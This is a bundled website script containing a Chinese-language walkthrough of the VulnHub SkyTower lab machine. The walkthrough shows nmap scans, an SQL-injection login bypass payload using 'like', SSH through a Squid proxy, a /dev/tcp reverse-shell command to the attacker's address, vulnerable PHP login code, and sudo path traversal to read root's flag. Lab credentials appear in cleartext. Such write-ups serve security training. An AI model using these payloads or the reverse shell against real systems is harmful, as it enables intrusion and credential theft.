"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[3920],{5131:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>o,contentTitle:()=>c,default:()=>h,frontMatter:()=>l,metadata:()=>r,toc:()=>t});const r=JSON.parse('{"id":"VulnHub/Virtual Machines/SkyTower","title":"SkyTower","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/SkyTower.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/SkyTower","permalink":"/docs/VulnHub/Virtual Machines/SkyTower","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/SkyTower.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"RickdiculouslyEasy","permalink":"/docs/VulnHub/Virtual Machines/RickdiculouslyEasy"},"next":{"title":"SolidState","permalink":"/docs/VulnHub/Virtual Machines/SolidState"}}');var a=s(4848),i=s(8453);const l={},c=void 0,o={},t=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"SSH",id:"ssh",level:2},{value:"sudo \u63d0\u6743",id:"sudo-\u63d0\u6743",level:2}];function d(n){const e={blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Tue Nov 12 05:07:23 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.56.101\r\nNmap scan report for 192.168.56.101\r\nHost is up (0.0010s latency).\r\nNot shown: 65532 closed tcp ports (conn-refused)\r\nPORT     STATE    SERVICE\r\n22/tcp   filtered ssh\r\n80/tcp   open     http\r\n3128/tcp open     squid-http\r\nMAC Address: 08:00:27:9A:C9:AA (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,a.jsx)(e.p,{children:"22\u7aef\u53e3\u88ab\u8fc7\u6ee4\u72b6\u6001"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Tue Nov 12 05:11:06 2024 as: nmap -sT -sV -sC -O -p22,80,3128 -oN nmap_results/detils_scan 192.168.56.101\r\nNmap scan report for 192.168.56.101\r\nHost is up (0.0019s latency).\r\n\r\nPORT     STATE    SERVICE    VERSION\r\n22/tcp   filtered ssh\r\n80/tcp   open     http       Apache httpd 2.2.22 ((Debian))\r\n|_http-title: Site doesn't have a title (text/html).\r\n|_http-server-header: Apache/2.2.22 (Debian)\r\n3128/tcp open     http-proxy Squid http proxy 3.1.20\r\n|_http-title: ERROR: The requested URL could not be retrieved\r\n|_http-server-header: squid/3.1.20\r\nMAC Address: 08:00:27:9A:C9:AA (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3\r\nOS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16\r\nNetwork Distance: 1 hop\n"})}),"\n",(0,a.jsx)(e.p,{children:"vuln scan"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Tue Nov 12 05:10:14 2024 as: nmap --script=vuln -p22,80,3128 -oN nmap_results/vuln_scan 192.168.56.101\r\nNmap scan report for 192.168.56.101\r\nHost is up (0.00078s latency).\r\n\r\nPORT     STATE    SERVICE\r\n22/tcp   filtered ssh\r\n80/tcp   open     http\r\n|_http-dombased-xss: Couldn't find any DOM based XSS.\r\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\r\n| http-csrf:\r\n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.101\r\n|   Found the following possible CSRF vulnerabilities:\r\n|\r\n|     Path: http://192.168.56.101:80/\r\n|     Form id:\r\n|_    Form action: login.php\r\n| http-sql-injection:\r\n|   Possible sqli for forms:\r\n|     Form at path: /, form's action: login.php. Fields that might be vulnerable:\r\n|_      email\r\n| http-enum:\r\n|_  /login.php: Possible admin folder\r\n3128/tcp open     squid-http\r\nMAC Address: 08:00:27:9A:C9:AA (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,a.jsx)(e.h2,{id:"web",children:"web"}),"\n",(0,a.jsx)(e.p,{children:"\u4e00\u4e2a\u767b\u5f55\u6846"}),"\n",(0,a.jsx)(e.p,{children:"whatweb\u8bc6\u522b\uff0c\u4e0d\u662fcms\uff0c\u5e94\u8be5\u662f\u81ea\u5df1\u5199\u7684"}),"\n",(0,a.jsxs)(e.p,{children:["\u6d4b\u8bd5\u53d1\u73b0\uff0c\u767b\u5f55\u53c2\u6570",(0,a.jsx)(e.code,{children:"email"}),"\u5b58\u5728sql\u6ce8\u5165\uff0c\u5e76\u4e14\u6709\u8fc7\u6ee4"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"email=' or 1=1--+&password=' or 12=1--+\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113170751097.png",alt:"image-20241113170751097"})}),"\n",(0,a.jsxs)(e.p,{children:["\u7b49\u53f7\u88ab\u8fc7\u6ee4\u4e86\uff0c\u7528",(0,a.jsx)(e.code,{children:"like"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"email=' and '1' like '1%23&password=' and '1' like '1%23\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u5229\u7528\u8fd9\u79cd\u65b9\u5f0f\u5c06\u5f15\u53f7\u95ed\u5408\uff0c\u6210\u529f\u767b\u5f55"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113171838209.png",alt:"image-20241113171838209"})}),"\n",(0,a.jsxs)(e.p,{children:["\u62ff\u5230\u51ed\u636e",(0,a.jsx)(e.code,{children:"john:hereisjohn"})]}),"\n",(0,a.jsx)(e.h2,{id:"ssh",children:"SSH"}),"\n",(0,a.jsx)(e.p,{children:"\u56e0\u4e3a22\u7aef\u53e3\u662f\u8fc7\u6ee4\u7684\uff0c\u4f46\u662f\u67093128\u7aef\u53e3\uff0c\u4e00\u4e2a\u4ee3\u7406\u670d\u52a1\uff0c\u5c1d\u8bd5\u4f7f\u75283128\u7aef\u53e3\u4ee3\u7406\u767b\u5f55"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"vim /etc/proxychains4.conf\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u5199\u5165"}),"\n",(0,a.jsxs)(e.blockquote,{children:["\n",(0,a.jsx)(e.p,{children:"http 192.168.56.101 3128"}),"\n"]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113172510303.png",alt:"image-20241113172510303"})}),"\n",(0,a.jsx)(e.p,{children:"\u767b\u5f55\u4e0a\u53bb\u4e86\uff0c\u4f46\u662f\u53c8\u6389\u4e86"}),"\n",(0,a.jsxs)(e.blockquote,{children:["\n",(0,a.jsxs)(e.p,{children:["Funds have been withdrawn:",(0,a.jsx)(e.code,{children:"\u8d44\u91d1\u5df2\u88ab\u64a4\u56de"})]}),"\n"]}),"\n",(0,a.jsx)(e.p,{children:"\u63d0\u793a\u6211\u4eec\uff0c\u88ab\u64a4\u56de\u4e86"}),"\n",(0,a.jsxs)(e.p,{children:[(0,a.jsx)(e.code,{children:"ssh"}),"\u547d\u4ee4\u8fde\u63a5\u65f6\uff0c\u53ef\u4ee5\u6267\u884c\u4e00\u6761\u547d\u4ee4"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"ssh [user@]hostname 'command'\n"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/SkyTower]\r\n\u2514\u2500# proxychains ssh john@192.168.56.101 'whoami;id'\r\n[proxychains] config file found: /etc/proxychains4.conf\r\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r\n[proxychains] DLL init: proxychains-ng 4.17\r\n[proxychains] Strict chain  ...  192.168.56.101:3128  ...  192.168.56.101:22  ...  OK\r\njohn@192.168.56.101's password:\r\njohn\r\nuid=1000(john) gid=1000(john) groups=1000(john)\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u6210\u529f\u6267\u884c\uff0c\u5c1d\u8bd5\u53cd\u5f39shell"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:'proxychains ssh john@192.168.56.101 "sh -i >& /dev/tcp/192.168.56.128/1234 0>&1"\n'})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"rlwrap nc -lvnp 1234\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113172959845.png",alt:"image-20241113172959845"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"cat .bashrc\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113173355069.png",alt:"image-20241113173355069"})}),"\n",(0,a.jsx)(e.p,{children:"\u602a\u4e0d\u5f97\u767b\u4e0d\u4e0a\u53bb\uff0c\u539f\u6765\u662f\u76f4\u63a5\u9000\u51fa\u4e86"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"mv .bashrc .bashrc.bak\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u5c06\u5b83\u5220\u9664\uff0c\u6216\u8005\u6539\u6587\u4ef6\u540d"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"proxychains ssh john@192.168.56.101\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u6210\u529f\u767b\u5f55"}),"\n",(0,a.jsx)(e.p,{children:"\u5e38\u89c4\u63d0\u6743\u6ca1\u6709\u5229\u7528\u70b9"}),"\n",(0,a.jsxs)(e.p,{children:["\u67e5\u770b",(0,a.jsx)(e.code,{children:"passwd"}),"\u6587\u4ef6\uff0c\u53d1\u73b0\u7528\u6237"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"sara:x:1001:1001:,,,:/home/sara:/bin/bash\r\nwilliam:x:1002:1002:,,,:/home/william:/bin/bash\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u53bbweb\u76ee\u5f55\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801\uff0c",(0,a.jsx)(e.code,{children:"login.php"}),"\u627e\u5230\u8d26\u6237\u5bc6\u7801"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-php",children:'<?php\r\n$db = new mysqli(\'localhost\', \'root\', \'root\', \'SkyTech\');\r\n\r\nif($db->connect_errno > 0){\r\n    die(\'Unable to connect to database [\' . $db->connect_error . \']\');\r\n\r\n}\r\n$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");\r\n$email = str_ireplace($sqlinjection, "", $_POST[\'email\']);\r\n$password = str_ireplace($sqlinjection, "", $_POST[\'password\']);\r\n\r\n$sql= "SELECT * FROM login where email=\'".$email."\' and password=\'".$password."\';";\r\n$result = $db->query($sql);\n'})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.code,{children:"root:root"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113174926345.png",alt:"image-20241113174926345"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{children:"john    hereisjohn\r\nsara  ihatethisjob\r\nwilliam  senseable\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u6211\u767b\u5f55",(0,a.jsx)(e.code,{children:"sara"}),"\u7528\u6237"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"john@SkyTower:/var/www$ su sara\r\nPassword:\r\n\r\nFunds have been withdrawn\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u8fd8\u662f\u548c\u4e4b\u524d\u4e00\u6837"}),"\n",(0,a.jsx)(e.h2,{id:"sudo-\u63d0\u6743",children:"sudo \u63d0\u6743"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"sara@SkyTower:~$ sudo -l\r\nMatching Defaults entries for sara on this host:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser sara may run the following commands on this host:\r\n    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u6709",(0,a.jsx)(e.code,{children:"cat"}),"\uff0c",(0,a.jsx)(e.code,{children:"ls"}),"\u547d\u4ee4\uff0c\u9650\u5236\u4e86\u6587\u4ef6\u5939\uff0c\u4f46\u662f\u53ef\u4ee5\u7528",(0,a.jsx)(e.code,{children:"../"}),"\u7a7f\u8d8a\u76ee\u5f55"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-shell",children:"sara@SkyTower:~$ sudo ls /accounts/../root/\r\nflag.txt\r\nsara@SkyTower:~$ sudo cat /accounts/../root/flag.txt\r\nCongratz, have a cold one to celebrate!\r\nroot password is theskytower\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u62ff\u5230root\u5bc6\u7801\uff1a",(0,a.jsx)(e.code,{children:"theskytower"})]})]})}function h(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(d,{...n})}):d(n)}},8453:(n,e,s)=>{s.d(e,{R:()=>l,x:()=>c});var r=s(6540);const a={},i=r.createContext(a);function l(n){const e=r.useContext(i);return r.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:l(n.components),r.createElement(i.Provider,{value:e},n.children)}}}]);